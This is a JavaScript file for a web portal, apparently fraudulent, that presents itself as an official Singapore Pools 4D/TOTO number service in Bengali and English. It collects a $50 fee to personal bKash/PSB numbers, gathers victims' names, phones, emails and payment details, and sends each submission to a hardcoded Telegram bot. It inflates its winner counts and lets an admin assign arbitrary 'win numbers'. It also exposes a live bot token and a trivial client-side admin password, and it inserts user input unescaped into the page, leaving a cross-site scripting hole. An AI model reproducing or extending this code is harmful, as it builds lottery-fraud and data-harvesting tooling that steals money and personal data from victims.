const firebaseConfig = {
    databaseURL: "https://singapore-portal-default-rtdb.firebaseio.com/"
};

if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

let pendingLogoDataUrl = null;
let pendingBannerImages = [];
let activeBannerList = [];
let currentSlideIndex = 0;
let autoSlideTimer = null;
let currentLang = 'bn';

// Search directory (Admin control excluded permanently)
const siteSearchDirectory = [
    { id: 'home', type: 'section', icon: 'fa-home', bn: 'হোম (Home)', en: 'Home', keywords: 'home হোম stats পরিসংখ্যান team অফিস' },
    { id: 'guide', type: 'section', icon: 'fa-book', bn: 'নির্দেশিকা (Guide)', en: 'Guide', keywords: 'guide নির্দেশিকা rules নিয়ম instructions' },
    { id: 'apply', type: 'section', icon: 'fa-file-alt', bn: 'আবেদন করুন (Apply Now)', en: 'Apply Now', keywords: 'apply আবেদন 4d toto নম্বর number ফর্ম form' },
    { id: 'status', type: 'section', icon: 'fa-search', bn: 'স্ট্যাটাস চেক (Check Status)', en: 'Check Status', keywords: 'status স্ট্যাটাস win number লটারি নম্বর check' },
    { id: 'apply-payment', type: 'action', icon: 'fa-credit-card', bn: 'পেমেন্ট নম্বর ও কপি (Payment)', en: 'Payment Numbers', keywords: 'payment পেমেন্ট bkash বিকাশ psb পিএসবি' }
];

function toggleThreeLineMenu() {
    const menu = document.getElementById('threeLineMenu');
    if (menu) menu.classList.toggle('hidden');
}

function selectDrawerSection(sectionId) {
    showSection(sectionId);
    const menu = document.getElementById('threeLineMenu');
    if (menu) menu.classList.add('hidden');
}

function toggleSearchBox() {
    const wrap = document.getElementById('searchInputWrapper');
    const input = document.getElementById('siteSearchInput');
    if (!wrap) return;
    wrap.classList.toggle('hidden');
    if (!wrap.classList.contains('hidden') && input) {
        input.focus();
        filterSiteOptions();
    } else {
        closeSearchBox();
    }
}

function closeSearchBox() {
    const wrap = document.getElementById('searchInputWrapper');
    const input = document.getElementById('siteSearchInput');
    const results = document.getElementById('searchResultsBox');
    if (wrap) wrap.classList.add('hidden');
    if (input) input.value = '';
    if (results) {
        results.classList.add('hidden');
        results.innerHTML = '';
    }
}

function filterSiteOptions() {
    const input = document.getElementById('siteSearchInput');
    const resultsBox = document.getElementById('searchResultsBox');
    if (!input || !resultsBox) return;

    const query = input.value.trim().toLowerCase();
    const matches = siteSearchDirectory.filter(item => {
        if (!query) return true;
        return item.bn.toLowerCase().includes(query) ||
               item.en.toLowerCase().includes(query) ||
               item.keywords.toLowerCase().includes(query);
    });

    resultsBox.classList.remove('hidden');
    if (!matches.length) {
        resultsBox.innerHTML = `<div class="search-result-item"><span>${currentLang === 'en' ? 'No matching option found' : 'কোনো অপশন পাওয়া যায়নি'}</span></div>`;
        return;
    }

    resultsBox.innerHTML = matches.map(item => {
        const label = currentLang === 'en' ? item.en : item.bn;
        return `
            <div class="search-result-item" onclick="openSearchedOption('${item.id}')">
                <span><i class="fas ${item.icon}" style="margin-right: 8px; color: #0284c7;"></i>${label}</span>
                <i class="fas fa-chevron-right" style="font-size: 10px; color: #64748b;"></i>
            </div>
        `;
    }).join('');
}

function openSearchedOption(optionId) {
    if (optionId === 'home' || optionId === 'guide' || optionId === 'apply' || optionId === 'status') {
        showSection(optionId);
    } else if (optionId === 'apply-payment') {
        showSection('apply');
        setTimeout(() => {
            const payBox = document.querySelector('.payment-box');
            if (payBox) payBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 120);
    }
    closeSearchBox();
}

function toggleFooterAbout() {
    const panel = document.getElementById('footerAboutContent');
    const icon = document.getElementById('footerAboutChevron');
    if (!panel) return;
    panel.classList.toggle('hidden');
    if (icon) {
        icon.classList.toggle('fa-chevron-down');
        icon.classList.toggle('fa-chevron-up');
    }
}

function showSection(sectionId) {
    const sections = ['home', 'guide', 'apply', 'status'];
    sections.forEach(id => {
        const el = document.getElementById(`section-${id}`);
        const navBtn = document.getElementById(`nav-${id}`);
        
        if (id === sectionId) {
            if(el) el.classList.remove('hidden');
            if (navBtn) navBtn.classList.add('active');
        } else {
            if(el) el.classList.add('hidden');
            if (navBtn) navBtn.classList.remove('active');
        }
    });
    window.scrollTo(0, 0);
}

document.addEventListener("DOMContentLoaded", function() {
    showSection('home'); 
    loadSettingsOnPage();
    loadLiveStats();
    changeLanguage('bn'); 
});

// লাইভ স্ট্যাটস রিয়েল-টাইম কাউন্টার আপডেট
function loadLiveStats() {
    db.ref('applications').on('value', (snapshot) => {
        const data = snapshot.val();
        let totalCount = 1420;
        let winnerCount = 850;
        if(data) {
            let keys = Object.keys(data);
            totalCount += keys.length;
            keys.forEach(k => {
                if(data[k].status === 'Approved') winnerCount++;
            });
        }
        let tEl = document.getElementById('totalAppStat');
        let wEl = document.getElementById('winnersStat');
        if(tEl) tEl.textContent = totalCount + "+";
        if(wEl) wEl.textContent = winnerCount + "+";
    });
}

function renderChatWelcomeMessage(lang) {
    const welcomeEl = document.getElementById('chatWelcomeMsg');
    if (!welcomeEl) return;
    if (lang === 'en') {
        welcomeEl.textContent = 'Welcome to Singapore Pools! Type what you want to know—such as Guide, Apply Now (4D/TOTO Number), Payment, or Check Status.';
    } else {
        welcomeEl.textContent = 'সিঙ্গাপুর পুলসে স্বাগতম! আপনি কোন অপশন সম্পর্কে জানতে চান তা মেসেজে লিখুন—যেমন: নির্দেশিকা, আবেদন করুন (৪ডি/টোটো নম্বর), পেমেন্ট বা স্ট্যাটাস চেক।';
    }
}

function syncChatLanguage(lang) {
    changeLanguage(lang);
}

function changeLanguage(lang) {
    currentLang = lang;
    document.documentElement.lang = lang;

    const headerSel = document.getElementById('langSelector');
    const chatSel = document.getElementById('chatLangSelector');
    if (headerSel && headerSel.value !== lang) headerSel.value = lang;
    if (chatSel && chatSel.value !== lang) chatSel.value = lang;

    const elements = document.querySelectorAll('[data-en]');
    elements.forEach(el => {
        const text = el.getAttribute(`data-${lang}`);
        if (text) {
            if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
                el.placeholder = text;
            } else if (el.tagName === 'OPTION') {
                el.textContent = text;
            } else {
                el.innerHTML = text;
            }
        }
    });

    renderChatWelcomeMessage(lang);

    if (activeBannerList.length > 0) {
        renderHeroSlider(activeBannerList);
    }

    const searchResults = document.getElementById('searchResultsBox');
    if (searchResults && !searchResults.classList.contains('hidden')) {
        filterSiteOptions();
    }
}

// লোগো রেন্ডারিং হেল্পার
function applyLogoToHeader(logoUrl) {
    const imgEl = document.getElementById('dynamicHeaderLogo');
    const fallbackEl = document.getElementById('defaultLogoFallback');
    if (logoUrl && logoUrl.trim() !== '') {
        if (imgEl) {
            imgEl.src = logoUrl;
            imgEl.classList.remove('hidden');
        }
        if (fallbackEl) fallbackEl.classList.add('hidden');
    } else {
        if (imgEl) {
            imgEl.src = '';
            imgEl.classList.add('hidden');
        }
        if (fallbackEl) fallbackEl.classList.remove('hidden');
    }
}

// ব্যানার স্লাইডার রেন্ডারিং ও অটো-স্লাইড (সর্বোচ্চ ৫টি ছবি)
function renderHeroSlider(banners) {
    const track = document.getElementById('heroSlidesTrack');
    const dotsContainer = document.getElementById('sliderDotsContainer');
    if (!track || !dotsContainer) return;

    const lang = currentLang;
    const titleText = lang === 'en' ? 'Official 4D & TOTO Number Portal' : 'অফিশিয়াল ৪ডি ও টোটো নম্বর পোর্টাল';
    const subText = lang === 'en' ? 'Apply securely for your official Singapore Pools number and check results instantly.' : 'নিরাপদে আপনার অফিশিয়াল সিঙ্গাপুর পুলস নম্বরের জন্য আবেদন করুন এবং ফলাফল যাচাই করুন।';
    const ctaText = lang === 'en' ? 'Apply For Number Now' : 'এখনই নম্বরের জন্য আবেদন করুন';

    const slidesToRender = (Array.isArray(banners) && banners.length > 0) ? banners.slice(0, 5) : [''];
    activeBannerList = slidesToRender;
    currentSlideIndex = 0;

    track.innerHTML = slidesToRender.map((imgUrl, idx) => {
        const bgStyle = imgUrl ? `background-image: url('${imgUrl}');` : `background: linear-gradient(135deg, #0b3d6b, #0f766e);`;
        const showText = idx === 0 || !imgUrl;
        return `
            <div class="hero-slide" style="${bgStyle}">
                <div class="banner-overlay" style="${imgUrl && idx > 0 ? 'background: rgba(5, 38, 71, 0.25);' : ''}">
                    ${showText ? `
                        <h2>${titleText}</h2>
                        <p>${subText}</p>
                        <button type="button" onclick="showSection('apply')" class="cta-btn">${ctaText}</button>
                    ` : ''}
                </div>
            </div>
        `;
    }).join('');

    if (slidesToRender.length > 1) {
        dotsContainer.innerHTML = slidesToRender.map((_, idx) => `
            <button type="button" class="slider-dot ${idx === 0 ? 'active' : ''}" onclick="goToSlide(${idx})" aria-label="Slide ${idx + 1}"></button>
        `).join('');
        startAutoSlide(slidesToRender.length);
    } else {
        dotsContainer.innerHTML = '';
        stopAutoSlide();
    }
}

function startAutoSlide(totalSlides) {
    stopAutoSlide();
    autoSlideTimer = setInterval(() => {
        currentSlideIndex = (currentSlideIndex + 1) % totalSlides;
        goToSlide(currentSlideIndex, true);
    }, 3500);
}

function stopAutoSlide() {
    if (autoSlideTimer) {
        clearInterval(autoSlideTimer);
        autoSlideTimer = null;
    }
}

function goToSlide(index, fromAuto = false) {
    const track = document.getElementById('heroSlidesTrack');
    const dots = document.querySelectorAll('.slider-dot');
    if (!track) return;
    currentSlideIndex = index;
    track.scrollTo({
        left: index * track.clientWidth,
        behavior: 'smooth'
    });
    dots.forEach((dot, idx) => {
        dot.classList.toggle('active', idx === index);
    });
    if (!fromAuto && activeBannerList.length > 1) {
        startAutoSlide(activeBannerList.length);
    }
}

// গ্লোবাল পেমেন্ট নম্বর, PNG লোগো ও ব্যানার স্লাইডার রিয়েল-টাইমে লোড করা
function loadSettingsOnPage() {
    try {
        db.ref('settings').on('value', (snapshot) => {
            const data = snapshot.val();
            let settings = data || { bikash: '01879774023', psb: '8461912', logoUrl: '', banners: [] };
            let bEl = document.getElementById('displayBikash');
            let pEl = document.getElementById('displayPsb');
            if(bEl) bEl.textContent = settings.bikash || '01879774023';
            if(pEl) pEl.textContent = settings.psb || '8461912';
            applyLogoToHeader(settings.logoUrl || '');
            renderHeroSlider(settings.banners || []);
        });
    } catch(e) {}
}

// অ্যাডমিন প্যানেল থেকে একসাথে সর্বোচ্চ ৫টি ব্যানার ছবি সিলেক্ট ও কম্প্রেস করা
function handleAdminBannerFiles(event) {
    const files = Array.from(event.target.files || []).slice(0, 5);
    if (!files.length) return;

    pendingBannerImages = [];
    let processed = 0;

    files.forEach((file) => {
        const reader = new FileReader();
        reader.onload = function(e) {
            const img = new Image();
            img.onload = function() {
                const canvas = document.createElement('canvas');
                const maxWidth = 650;
                let width = img.width;
                let height = img.height;

                if (width > maxWidth) {
                    height *= maxWidth / width;
                    width = maxWidth;
                }

                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0, width, height);

                pendingBannerImages.push(canvas.toDataURL('image/jpeg', 0.75));
                processed++;

                if (processed === files.length) {
                    renderAdminBannerThumbs(pendingBannerImages);
                }
            };
            img.src = e.target.result;
        };
        reader.readAsDataURL(file);
    });
}

function renderAdminBannerThumbs(list) {
    const wrap = document.getElementById('adminBannerPreviewList');
    if (!wrap) return;
    if (!list || !list.length) {
        wrap.innerHTML = '';
        return;
    }
    wrap.innerHTML = list.map((src, i) => `<img src="${src}" alt="Banner ${i + 1}" class="admin-banner-thumb">`).join('');
}

function clearCustomBanners() {
    pendingBannerImages = [];
    const input = document.getElementById('adminBannerFilesInput');
    if (input) input.value = '';
    renderAdminBannerThumbs([]);
}

// অ্যাডমিন প্যানেল থেকে PNG ফটো সিলেক্ট ও কম্প্রেস করে প্রিভিউ তৈরি
function handleAdminLogoFile(event) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement('canvas');
            const maxSize = 180;
            let width = img.width;
            let height = img.height;

            if (width > height) {
                if (width > maxSize) {
                    height *= maxSize / width;
                    width = maxSize;
                }
            } else {
                if (height > maxSize) {
                    width *= maxSize / height;
                    height = maxSize;
                }
            }

            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            ctx.clearRect(0, 0, width, height);
            ctx.drawImage(img, 0, 0, width, height);

            pendingLogoDataUrl = canvas.toDataURL('image/png', 0.9);
            const previewImg = document.getElementById('adminLogoPreviewImg');
            if (previewImg) {
                previewImg.src = pendingLogoDataUrl;
                previewImg.style.display = 'inline-block';
            }
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
}

function clearCustomLogo() {
    pendingLogoDataUrl = '';
    const fileInput = document.getElementById('adminLogoFileInput');
    if (fileInput) fileInput.value = '';
    const previewImg = document.getElementById('adminLogoPreviewImg');
    if (previewImg) {
        previewImg.src = '';
        previewImg.style.display = 'none';
    }
}

function copyToClipboard(elementId, btnElement) {
    const textToCopy = document.getElementById(elementId).textContent;
    navigator.clipboard.writeText(textToCopy).then(() => {
        let originalText = btnElement.innerHTML;
        btnElement.innerHTML = (currentLang === 'en') ? 'Copied!' : 'কপি হয়েছে!';
        btnElement.style.background = '#10b981';
        setTimeout(() => {
            btnElement.innerHTML = originalText;
            btnElement.style.background = '#0284c7';
        }, 2000);
    });
}

function toggleChatBox() {
    const chatBox = document.getElementById('liveChatBox');
    if(chatBox) {
        chatBox.classList.toggle('hidden');
        renderChatWelcomeMessage(currentLang);
    }
}

function handleChatKey(e) {
    if (e.key === 'Enter') sendChatMessage();
}

function buildAutoReply(userMsg, lang) {
    const lower = userMsg.toLowerCase();
    if (lang === 'en') {
        if (lower.includes('status') || lower.includes('win') || lower.includes('check') || lower.includes('app')) {
            return 'Check Status Guideline: Open the "Check Status" section, enter your Application ID (e.g. APP-4892) and your contact number, then press Check Status to view approval and your number.';
        }
        if (lower.includes('apply') || lower.includes('4d') || lower.includes('toto') || lower.includes('number') || lower.includes('form')) {
            return 'Apply Now Guideline: Open the "Apply Now" section, fill in your name, contact, and Gmail, select 4D Number or TOTO Number, pay the $50 fee, enter your sender account and last 4 transaction digits, and submit.';
        }
        if (lower.includes('pay') || lower.includes('bkash') || lower.includes('psb') || lower.includes('fee')) {
            return 'Payment Guideline: The official application fee is $50. In "Apply Now", copy the bKash or PSB account number, send the payment, and enter your sender account and last 4 transaction ID digits in the form.';
        }
        if (lower.includes('guide') || lower.includes('rule') || lower.includes('help') || lower.includes('instruction')) {
            return 'Guide Summary: 1) Choose 4D Number or TOTO Number in "Apply Now", 2) Complete the $50 payment and note the last 4 transaction digits, 3) Save your Application ID and check results in "Check Status".';
        }
        return 'General Guideline: You can use "Home" for overview & stats, "Guide" for instructions, "Apply Now" to submit a 4D or TOTO number application, and "Check Status" with your Application ID & contact number to check your status.';
    } else {
        if (lower.includes('স্ট্যাটাস') || lower.includes('চেক') || lower.includes('লটারি') || lower.includes('status') || lower.includes('check')) {
            return 'স্ট্যাটাস চেক নির্দেশিকা: "স্ট্যাটাস চেক" সেকশনে গিয়ে আপনার অ্যাপ্লিকেশন আইডি (যেমন: APP-4892) এবং যোগাযোগের নম্বর লিখে স্ট্যাটাস চেক করুন বাটনে চাপ দিন। অনুমোদিত হলে আপনার নম্বর ও বিস্তারিত দেখতে পাবেন।';
        }
        if (lower.includes('আবেদন') || lower.includes('৪ডি') || lower.includes('টোটো') || lower.includes('নম্বর') || lower.includes('apply')) {
            return 'আবেদন নির্দেশিকা: "আবেদন করুন" সেকশনে গিয়ে নাম, ফোন নম্বর ও জিমেইল দিন, ৪ডি নম্বর বা টোটো নম্বর সিলেক্ট করুন, $50 ফি পাঠিয়ে প্রেরক নম্বর ও ট্রানজেকশন আইডির শেষ ৪ ডিজিট দিয়ে ফর্ম জমা দিন।';
        }
        if (lower.includes('পেমেন্ট') || lower.includes('বিকাশ') || lower.includes('পিএসবি') || lower.includes('ফি') || lower.includes('bkash') || lower.includes('psb')) {
            return 'পেমেন্ট নির্দেশিকা: অফিশিয়াল আবেদন ফি $50। "আবেদন করুন" ফরমের পেমেন্ট বক্স থেকে বিকাশ বা পিএসবি নম্বর কপি করে টাকা পাঠান এবং আপনার প্রেরক নম্বর ও ট্রানজেকশনের শেষ ৪ ডিজিট ফরমে লিখুন।';
        }
        if (lower.includes('নির্দেশিকা') || lower.includes('নিয়ম') || lower.includes('গাইড') || lower.includes('guide')) {
            return 'নির্দেশিকা গাইডলাইন: ১) "আবেদন করুন" অপশনে গিয়ে ৪ডি বা টোটো নম্বর নির্বাচন করুন, ২) $50 ফি পাঠিয়ে ট্রানজেকশন আইডির শেষ ৪ ডিজিট দিন, ৩) প্রাপ্ত অ্যাপ্লিকেশন আইডি সংরক্ষণ করে "স্ট্যাটাস চেক" অপশনে স্ট্যাটাস দেখুন।';
        }
        return 'সাধারণ নির্দেশিকা: সাইটের তথ্য ও পরিসংখ্যানের জন্য "হোম", নিয়মাবলির জন্য "নির্দেশিকা", ৪ডি বা টোটো নম্বরের জন্য "আবেদন করুন" এবং ফলাফল/স্ট্যাটাস দেখতে "স্ট্যাটাস চেক" অপশন ব্যবহার করুন।';
    }
}

function sendChatMessage() {
    const input = document.getElementById('chatInput');
    if(!input || !input.value.trim()) return;
    const msg = input.value.trim();
    const chatBody = document.getElementById('chatBody');

    chatBody.innerHTML += `<div class="chat-msg user">${msg}</div>`;
    input.value = '';
    chatBody.scrollTop = chatBody.scrollHeight;

    setTimeout(() => {
        const replyText = buildAutoReply(msg, currentLang);
        chatBody.innerHTML += `<div class="chat-msg bot">${replyText}</div>`;
        chatBody.scrollTop = chatBody.scrollHeight;
    }, 450);
}

// টেলিগ্রাম বটে নোটিফিকেশন পাঠানো
function sendTelegramNotification(appData) {
    const botToken = "8711729817:AAG2VUDDl3lmTCcPZGADEpMo3U_OeqcIJW8";
    const chatId = "7560607133";

    let textMessage = `🚨 *নতুন সিঙ্গাপুর পুলস আবেদন* 🚨\n\n` +
                      `🆔 *App ID:* \`${appData.appNo}\`\n` +
                      `👤 *Name:* ${appData.firstName} ${appData.lastName}\n` +
                      `📞 *Contact:* ${appData.contactNumber}\n` +
                      `📧 *Gmail:* ${appData.gmail}\n` +
                      `🏷 *Number Type:* ${appData.permitType}\n` +
                      `💳 *Sender Acc:* ${appData.senderAccount}\n` +
                      `🔢 *Last Digits:* ${appData.lastDigits}\n` +
                      `⚡ *Status:* ${appData.status}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: textMessage, parse_mode: 'Markdown' })
    }).catch(err => {});
}

// ফর্ম সাবমিট হ্যান্ডলার
function handleFormSubmit(e) {
    e.preventDefault();

    const submitBtn = document.getElementById('submitBtn');
    if(submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = (currentLang === 'en') ? 'Submitting...' : 'জমা দেওয়া হচ্ছে...';
    }

    const appNo = 'APP-' + Math.floor(1000 + Math.random() * 9000);
    
    const newApp = {
        appNo: appNo,
        firstName: document.getElementById('firstName').value.trim(),
        lastName: document.getElementById('lastName').value.trim(),
        contactNumber: document.getElementById('contactNumber').value.trim(),
        gmail: document.getElementById('gmail').value.trim(),
        permitType: document.getElementById('permitType').value,
        senderAccount: document.getElementById('senderAccount').value.trim(),
        lastDigits: document.getElementById('lastDigits').value.trim(),
        receiveMoneyInfo: document.getElementById('receiveMoneyInfo').value.trim() || 'N/A',
        status: 'Pending',
        winNumber: null
    };

    db.ref('applications/' + appNo).set(newApp, (error) => {
        if(submitBtn) {
            submitBtn.disabled = false;
            submitBtn.textContent = (currentLang === 'en') ? 'Submit Application' : 'আবেদন জমা দিন';
        }

        if(!error) {
            sendTelegramNotification(newApp);

            document.getElementById('generatedAppIdBox').textContent = appNo;
            document.getElementById('successModal').classList.remove('hidden');
            document.getElementById('applicationForm').reset();
        } else {
            alert(currentLang === 'en' ? 'Error submitting application. Try again.' : 'আবেদন জমা দিতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
        }
    });
}

function closeSuccessModal() {
    document.getElementById('successModal').classList.add('hidden');
    document.getElementById('checkAppNo').value = document.getElementById('generatedAppIdBox').textContent;
    showSection('status');
}

// স্ট্যাটাস চেক ফাংশন
function checkStatus() {
    const appNo = document.getElementById('checkAppNo').value.trim();
    const contact = document.getElementById('checkContact').value.trim();
    const resultDiv = document.getElementById('statusResult');

    if(!appNo || !contact) {
        alert(currentLang === 'en' ? 'Please enter both Application ID and Contact number.' : 'দয়া করে অ্যাপ্লিকেশন আইডি এবং কন্টাক্ট নম্বর উভয়ই লিখুন।');
        return;
    }

    db.ref('applications/' + appNo).once('value', (snapshot) => {
        const found = snapshot.val();
        resultDiv.classList.remove('hidden');

        if(found && found.contactNumber === contact) {
            let bgStyle = found.status === 'Approved' ? 'background: #dcfce7; color: #166534; border: 1px solid #bbf7d0;' : 
                          found.status === 'Rejected' ? 'background: #fee2e2; color: #991b1b; border: 1px solid #fecaca;' : 
                          'background: #fef9c3; color: #854d0e; border: 1px solid #fef08a;';
                
            let winSectionHTML = '';
            if(found.status === 'Approved') {
                winSectionHTML = `
                    <div style="margin-top: 15px; background: white; padding: 15px; border-radius: 8px; border: 1px solid #86efac; text-align: left;">
                        <h4 style="color: #15803d; margin-bottom: 5px;"><i class="fas fa-star"></i> ${currentLang === 'en' ? 'Application Approved!' : 'আবেদন অনুমোদিত হয়েছে!'}</h4>
                        <p style="font-size: 13px; color: #334155; margin-bottom: 8px;">${currentLang === 'en' ? 'Your Win Number:' : 'আপনার লটারি নম্বর:'} <strong style="color: #0284c7; font-size: 16px;">${found.winNumber}</strong></p>
                    </div>
                `;
            } else if(found.status === 'Rejected') {
                winSectionHTML = `<p style="margin-top: 10px; font-weight: bold; color: #dc2626;">${currentLang === 'en' ? '❌ Your application has been rejected by Admin.' : '❌ আপনার আবেদনটি অ্যাডমিন কর্তৃক বাতিল করা হয়েছে।'}</p>`;
            } else {
                winSectionHTML = `<p style="margin-top: 10px; font-weight: bold; color: #ca8a04;">${currentLang === 'en' ? '⏳ Status: Pending. Your application is under review.' : '⏳ স্ট্যাটাস: পেন্ডিং (Pending)। আপনার আবেদনটি যাচাই করা হচ্ছে।'}</p>`;
            }

            resultDiv.style = bgStyle + " padding: 15px; border-radius: 8px; margin-top: 15px;";
            resultDiv.innerHTML = `
                <strong>${currentLang === 'en' ? 'Application ID:' : 'অ্যাপ্লিকেশন আইডি:'} ${found.appNo}</strong><br>
                ${currentLang === 'en' ? 'Name:' : 'নাম:'} ${found.firstName} ${found.lastName}<br>
                ${currentLang === 'en' ? 'Number Type:' : 'নম্বর টাইপ:'} ${found.permitType}<br>
                <div style="margin-top: 5px; font-weight: bold; text-transform: uppercase;">${currentLang === 'en' ? 'Status:' : 'স্ট্যাটাস:'} ${found.status}</div>
                ${winSectionHTML}
            `;
        } else {
            resultDiv.style = "background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; padding: 15px; border-radius: 8px; margin-top: 15px;";
            resultDiv.innerHTML = `<strong>${currentLang === 'en' ? 'No application found with this info!' : 'এই তথ্যের সাথে কোনো আবেদন পাওয়া যায়নি! (ভুল তথ্য দিয়েছেন)'}</strong>`;
        }
    });
}

// পাসওয়ার্ড সুরক্ষিত অ্যাডমিন প্যানেল প্রম্পট
function promptAdminPassword() {
    const inputPwd = prompt(currentLang === 'en' ? "Enter Admin Password:" : "অ্যাডমিন পাসওয়ার্ড দিন:");
    if (inputPwd === "admin123") {
        document.getElementById('adminModal').classList.remove('hidden');
        loadAdminData();
        loadAdminSettingsToForm();
    } else if (inputPwd !== null) {
        alert(currentLang === 'en' ? "Wrong Password!" : "ভুল পাসওয়ার্ড!");
    }
}

function closeAdminModal() {
    document.getElementById('adminModal').classList.add('hidden');
}

function loadAdminSettingsToForm() {
    db.ref('settings').once('value', (snapshot) => {
        const settings = snapshot.val() || { bikash: '01879774023', psb: '8461912', logoUrl: '', banners: [] };
        document.getElementById('adminBikashInput').value = settings.bikash || '01879774023';
        document.getElementById('adminPsbInput').value = settings.psb || '8461912';
        pendingLogoDataUrl = settings.logoUrl || null;
        pendingBannerImages = Array.isArray(settings.banners) ? settings.banners.slice(0, 5) : [];

        renderAdminBannerThumbs(pendingBannerImages);

        const previewImg = document.getElementById('adminLogoPreviewImg');
        if (previewImg) {
            if (settings.logoUrl) {
                previewImg.src = settings.logoUrl;
                previewImg.style.display = 'inline-block';
            } else {
                previewImg.src = '';
                previewImg.style.display = 'none';
            }
        }
    });
}

// গ্লোবাল পেমেন্ট নম্বর, PNG লোগো ও ব্যানার স্লাইডার আপডেট
function saveAdminSettings() {
    const bikashVal = document.getElementById('adminBikashInput').value.trim();
    const psbVal = document.getElementById('adminPsbInput').value.trim();

    if(!bikashVal || !psbVal) {
        alert(currentLang === 'en' ? "Please fill both numbers!" : "দুটি নম্বরই পূরণ করুন!");
        return;
    }

    const newSettings = {
        bikash: bikashVal,
        psb: psbVal,
        logoUrl: pendingLogoDataUrl !== null ? pendingLogoDataUrl : '',
        banners: pendingBannerImages.slice(0, 5)
    };

    db.ref('settings').set(newSettings, (error) => {
        if(!error) {
            alert(currentLang === 'en' ? "Banner slides, logo & payment numbers updated for everyone!" : "ব্যানার ছবি, লোগো ও পেমেন্ট নম্বর সকল ইউজারের জন্য সফলভাবে আপডেট হয়েছে!");
        } else {
            alert(currentLang === 'en' ? "Error updating settings!" : "আপডেট করতে সমস্যা হয়েছে!");
        }
    });
}

// সেন্ট্রাল অ্যাডমিন ড্যাশবোর্ড ও টেবিল লোড করা
function loadAdminData() {
    let container = document.getElementById('adminTableContainer');
    if(!container) return;

    const filterVal = (document.getElementById('adminFilterInput')?.value || '').trim().toLowerCase();

    db.ref('applications').once('value', (snapshot) => {
        const data = snapshot.val();
        let pendingCount = 0;
        let approvedCount = 0;
        let rejectedCount = 0;

        if(!data) {
            document.getElementById('adminPendingCount').textContent = '0';
            document.getElementById('adminApprovedCount').textContent = '0';
            document.getElementById('adminRejectedCount').textContent = '0';
            container.innerHTML = `<p style="text-align:center; color:#64748b; padding:20px;">${currentLang === 'en' ? 'No applications submitted yet.' : 'এখনো কোনো আবেদন জমা হয়নি।'}</p>`;
            return;
        }

        const keys = Object.keys(data);
        keys.forEach((appNo) => {
            const st = data[appNo].status;
            if (st === 'Approved') approvedCount++;
            else if (st === 'Rejected') rejectedCount++;
            else pendingCount++;
        });

        document.getElementById('adminPendingCount').textContent = pendingCount;
        document.getElementById('adminApprovedCount').textContent = approvedCount;
        document.getElementById('adminRejectedCount').textContent = rejectedCount;

        const filteredKeys = keys.filter((appNo) => {
            if (!filterVal) return true;
            const a = data[appNo];
            return appNo.toLowerCase().includes(filterVal) ||
                   (a.contactNumber || '').toLowerCase().includes(filterVal) ||
                   (a.firstName || '').toLowerCase().includes(filterVal);
        });

        if (!filteredKeys.length) {
            container.innerHTML = `<p style="text-align:center; color:#64748b; padding:20px;">${currentLang === 'en' ? 'No matching applications.' : 'কোনো আবেদন মেলেনি।'}</p>`;
            return;
        }

        let html = `
            <table>
                <thead>
                    <tr>
                        <th>App & Type</th>
                        <th>Name & Contact</th>
                        <th>Acc / Trx</th>
                        <th>Win Number (Custom)</th>
                        <th>Status & Action</th>
                    </tr>
                </thead>
                <tbody>
        `;

        filteredKeys.forEach((appNo) => {
            let app = data[appNo];
            let statusColor = app.status === 'Approved' ? 'color: #16a34a; font-weight:bold;' :
                              app.status === 'Rejected' ? 'color: #dc2626; font-weight:bold;' :
                              'color: #ca8a04; font-weight:bold;';

            let currentWinNum = app.winNumber || (app.permitType === 'TOTO' ? Math.floor(1000000 + Math.random() * 9000000) : Math.floor(1000 + Math.random() * 9000));

            html += `
                <tr>
                    <td><strong>${app.appNo}</strong><br><span style="color:#0284c7; font-weight:bold;">${app.permitType}</span></td>
                    <td>${app.firstName} ${app.lastName}<br><small>${app.contactNumber}</small></td>
                    <td>${app.senderAccount}<br><small style="color: #64748b;">(Trx: ${app.lastDigits})</small></td>
                    <td>
                        <input type="text" id="winInput_${app.appNo}" value="${currentWinNum}" style="width: 85px; padding: 4px; font-size: 11px; text-align: center; border: 1px solid #cbd5e1; border-radius: 4px;" placeholder="Win No">
                    </td>
                    <td>
                        <span style="${statusColor}">${app.status}</span><br>
                        <div style="margin-top: 4px; display: flex; gap: 3px;">
                            <button type="button" onclick="updateStatus('${app.appNo}', 'Approved')" style="background:#22c55e; color:white; border:none; padding:3px 6px; border-radius:3px; cursor:pointer; font-size:10px;">Approve</button>
                            <button type="button" onclick="updateStatus('${app.appNo}', 'Rejected')" style="background:#ef4444; color:white; border:none; padding:3px 6px; border-radius:3px; cursor:pointer; font-size:10px;">Reject</button>
                        </div>
                    </td>
                </tr>
            `;
        });

        html += `</tbody></table>`;
        container.innerHTML = html;
    });
}

// স্ট্যাটাস ও উইন নম্বর আপডেট
function updateStatus(appNo, newStatus) {
    db.ref('applications/' + appNo).once('value', (snapshot) => {
        let app = snapshot.val();
        if(app) {
            app.status = newStatus;
            if(newStatus === 'Approved') {
                const customWinInput = document.getElementById(`winInput_${appNo}`);
                app.winNumber = customWinInput ? customWinInput.value.trim() : (app.permitType === 'TOTO' ? Math.floor(1000000 + Math.random() * 9000000) : Math.floor(1000 + Math.random() * 9000));
            } else {
                app.winNumber = null;
            }

            db.ref('applications/' + appNo).set(app, (error) => {
                if(!error) {
                    loadAdminData();
                    alert(currentLang === 'en'
                        ? `Application ${newStatus === 'Approved' ? 'approved with win number' : 'rejected'} successfully!`
                        : `আবেদন সফলভাবে ${newStatus === 'Approved' ? 'অনুমোদন ও উইন নম্বর সহ' : 'বাতিল'} করা হয়েছে!`);
                }
            });
        }
    });
}
